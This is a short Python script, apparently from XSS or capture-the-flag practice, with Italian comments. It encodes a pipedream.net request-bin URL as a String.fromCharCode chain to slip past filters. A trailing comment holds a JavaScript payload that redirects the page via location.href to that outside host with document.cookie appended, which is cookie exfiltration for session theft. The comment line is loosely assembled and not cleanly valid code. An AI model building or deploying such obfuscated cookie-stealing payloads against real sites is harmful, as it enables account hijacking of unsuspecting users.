link = "https://enwn41qcm4c0o.x.pipedream.net/"
payload = "var link = "
for n in link:#converte il link in charcode
	payload += f"String.fromCharCode({ord(n)})+"#ord() è una funzione python che preso in input un carattere ne restituisce il numero unicode
print(payload[:-1])

#location.href=String.fromCharCode(104)+https://ene25wt5mpim6.x.pipedream.net/+String.fromCharCode(104)+document.cookie
